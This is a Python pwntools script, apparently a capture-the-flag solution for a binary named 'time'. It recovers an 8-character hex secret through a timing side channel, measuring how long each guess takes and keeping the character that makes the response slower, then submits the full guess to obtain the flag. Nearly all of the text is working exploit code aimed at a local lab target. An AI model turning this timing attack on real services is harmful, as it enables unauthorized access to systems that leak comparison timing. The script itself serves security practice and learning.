#!/usr/bin/env python3.8

from pwn import *
import warnings
import re
import string
import time

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 6969)
    else:
        r = process([elf.path])
    return r

# Specify GDB script here (breakpoints etc)
gdbscript = """
    set follow-fork-mode child
    start
    b *life+21
    b *life+78
    b *life+122
    b *life+188
"""

# Binary filename
exe = '../Source/time'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'error'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# =======================
# EXPLOIT AFTER THIS
# =======================

# libc = ELF("./libc.so.6", checksec=False)
possible_chars = string.digits + "abcdef"
guess_length = 8
guess = ['0'] * guess_length # initial guess

cnt = 1
current_max_time = 0
# will take ~50s to finish the script
while cnt <= guess_length:
    
    for c in possible_chars:
        r = connect()
        guess[-cnt] = c
        r.sendlineafter(": \n", "".join(guess))
        start = time.time()
        resp = r.recvline(timeout=5)
        end = time.time()
        # print(resp)
        total_time = end - start
        # print(f"time taken for {guess}: {total_time}")
        if total_time - current_max_time > 0.20:
            correct_guess, current_max_time = c, total_time
            r.close()
            break
        r.close()
        
    guess[-cnt] = correct_guess
    print(f"correct guess at position {guess_length-cnt+1} is {correct_guess}")
    cnt += 1
    
print('sending the final guess:', "".join(guess))
# send the final guess to receive the flag
r = connect()
r.sendlineafter(": \n", "".join(guess))

resp = r.recvall(timeout=4)
print(resp)
# r.interactive()
